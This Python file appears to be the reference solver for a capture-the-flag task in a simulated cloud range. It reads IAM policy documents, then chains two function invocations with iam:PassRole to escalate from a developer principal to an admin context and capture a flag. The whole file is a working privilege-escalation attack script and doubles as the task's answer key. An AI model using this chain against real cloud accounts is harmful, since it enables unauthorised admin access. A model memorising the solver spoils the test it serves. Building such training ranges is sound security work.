"""Intended-path solver: read the policy docs, then chain the invokes."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def _name_from_arn(arn: str) -> str:
    return arn.rstrip("/").split("/")[-1].split(":")[-1]


def _resources_for(identity_json: dict, action: str) -> list[str]:
    found: list[str] = []
    for attached in identity_json.get("attachedPolicies", []):
        for stmt in attached["document"]["Statement"]:
            if action in stmt.get("Action", []) and stmt.get("Effect") == "Allow":
                found.extend(stmt.get("Resource", []))
    return found


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()

    me = httpx.get(f"{base}/whoami", timeout=10).json()
    if me["principal"] != "dev-cli":
        return SolveResult(
            results=[
                TaskResult(
                    task_id="chain-to-admin-context",
                    ok=False,
                    detail="unexpected starting principal",
                )
            ]
        )

    user = httpx.get(f"{base}/iam/users/dev-cli", timeout=10).json()
    invokable = _resources_for(user, "lambda:InvokeFunction")
    passable = _resources_for(user, "iam:PassRole")
    if not invokable or not passable:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="chain-to-admin-context",
                    ok=False,
                    detail="could not identify the PassRole plus InvokeFunction pair",
                )
            ]
        )

    fn_name = _name_from_arn(invokable[0])
    role_name = _name_from_arn(passable[0])

    first = httpx.post(
        f"{base}/lambda/functions/{fn_name}/invoke",
        json={"pass_role": role_name},
        timeout=10,
    ).json()
    runner_token = first.get("contextToken")
    if not runner_token:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="chain-to-admin-context",
                    ok=False,
                    detail=f"first hop failed: {first}",
                )
            ]
        )

    role_doc = httpx.get(f"{base}/iam/roles/{role_name}", timeout=10).json()
    next_fn = _name_from_arn(_resources_for(role_doc, "lambda:InvokeFunction")[0])
    next_role = _name_from_arn(_resources_for(role_doc, "iam:PassRole")[0])

    second = httpx.post(
        f"{base}/lambda/functions/{next_fn}/invoke",
        headers={"X-Sim-Context": runner_token},
        json={"pass_role": next_role},
        timeout=10,
    ).json()
    admin_token = second.get("contextToken")
    if not admin_token:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="chain-to-admin-context",
                    ok=False,
                    detail=f"second hop failed: {second}",
                )
            ]
        )

    res = httpx.get(
        f"{base}/admin/context",
        headers={"Authorization": f"Bearer {admin_token}"},
        timeout=10,
    )
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="chain-to-admin-context",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "admin context did not yield a flag",
            )
        ]
    )
